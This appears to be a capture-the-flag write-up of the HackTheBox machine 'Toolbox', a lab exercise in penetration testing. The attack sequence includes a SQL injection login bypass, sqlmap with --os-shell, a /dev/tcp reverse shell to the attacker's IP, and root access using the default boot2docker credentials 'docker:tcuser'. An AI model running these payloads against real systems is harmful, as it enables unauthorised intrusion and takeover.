# **Description**

Hello hackers, I hope you are doing well. We are doing [Toolbox](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.236

We have FTP with anonymous login allowed, ssh on port 22, SMB on port (135,139,445) and Apache https web server and it says it's `Debian`, this means it's running on a docker container.

## FTP

Let's login and see what's there.

```terminal

```

We found one file which is `docker-toolbox.exe`.

Docker-Toolbox allows to deploy containers in windows before windows has support for Docker.

Let's move on.

## SMB

Let's list available shares.

```terminal
$ smbclient -L 10.10.10.236 -N                                                                                                                           
session setup failed: NT_STATUS_ACCESS_DENIED           
```

Couldn't do that, we get access denied.

## Web

Before going to the web page, nmap scripts had showed us the domain `admin.megalogistic.com`, so let's add that to /etc/hosts along with `megalogistic.com`.

![](1.png)

Nothing interesting is this page, and everything is static pages.

Let's go the admin subdomain.

![](2.png)

We got a login page, i tried some default credentials and failed, but managed to login via sql injection with the payload `' or 1=1 --`.

![](3.png)

Since the page is vulnerable to sqli, let's throw is to `sqlmap` and see what we can get back.

```bash
sqlmap -u 'https://admin.megalogistic.com/' --forms --batch --dump
```

![](4.png)

Managed to retrieve the admin hash, but couldn't crack it.

# **Foothold**

Let's use `--os-shell` option is `sqlmap` to get a shell and execute commands on the target.

![](5.png)

With that i put this reverse shell `sh -i >& /dev/tcp/10.10.17.90/9001 0>&1` in a file and executed the file to get a reverse shell.

![](6.png)


# **Privilege Escalation**

Running `ifconfig` shows our ip `172.17.0.2`

```terminal
www-data@bc56e3cc55e9:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)

        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 553291  bytes 572398666 (545.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Running `uname -a` we get the following result

```terminal
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux
```

The first thing we notice is the hostname which indicate we're in a docker container and the linux distribution is called `boot2docker`

Searching for `boot2docker exploit` i found this [article](https://rioasmara.com/2021/08/08/privilege-escalation-boot2docker/) that shows default credentials for the host of this container.

Let's use the credentials `docker:tcuser` to ssh to the host at `172.17.0.1`

```terminal
postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1                                                                                                                
docker@172.17.0.1's password:                                                                                                                                                                                                                                                            
   ( '>')

docker                                                                                                                                                        
docker@box:~$ id                                                                
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)

```

If we check our privileges we see that we can run anything as root.

```terminal
docker@box:~$ sudo -l                                                           
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
```

Let's get a root shell with `sudo su`.

The root directory is empty so i searched for the root flag and found it's place.

```terminal
root@box:~# find / -type f -name root.txt 2>/dev/null                           
/c/Users/Administrator/Desktop/root.txt 
```
